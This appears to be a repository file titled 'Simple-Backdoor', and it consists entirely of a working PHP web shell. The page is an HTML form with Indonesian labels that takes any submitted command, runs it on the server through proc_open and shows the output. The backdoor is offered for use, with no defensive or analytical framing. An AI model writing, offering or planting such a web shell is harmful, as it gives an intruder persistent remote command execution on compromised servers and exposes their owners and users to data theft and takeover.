# Simple-Backdoor

```bash
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Shell</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>

<div class="container mt-5">
    <h2 class="mb-4">Shell Command</h2>
    <form method="POST">
        <div class="mb-3">
            <label for="command" class="form-label">Command</label>
            <input type="text" class="form-control" id="command" name="command" required>
        </div>
        <button type="submit" class="btn btn-primary">Jalankan</button>
    </form>

    <?php
    function performAction($cmd) {
        $cmd = escapeshellcmd($cmd);

        $descriptorSpec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        
        $process = proc_open($cmd, $descriptorSpec, $pipes);
        
        if (is_resource($process)) {

            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            
            proc_close($process);
            
            return $output;
        }
        
        return false;
    }

    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $command = isset($_POST['command']) ? $_POST['command'] : '';
        
        if ($command) {
            $result = performAction($command);
            
            if ($result) {
                echo "<div class='mt-4'>
                        <h4>Hasil Output:</h4>
                        <pre class='bg-light p-3 border rounded'>$result</pre>
                      </div>";
            } else {
                echo "<div class='alert alert-danger mt-4'>Perintah gagal dijalankan atau hasil kosong.</div>";
            }
        } else {
            echo "<div class='alert alert-warning mt-4'>Mohon masukkan perintah.</div>";
        }
    }
    ?>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```
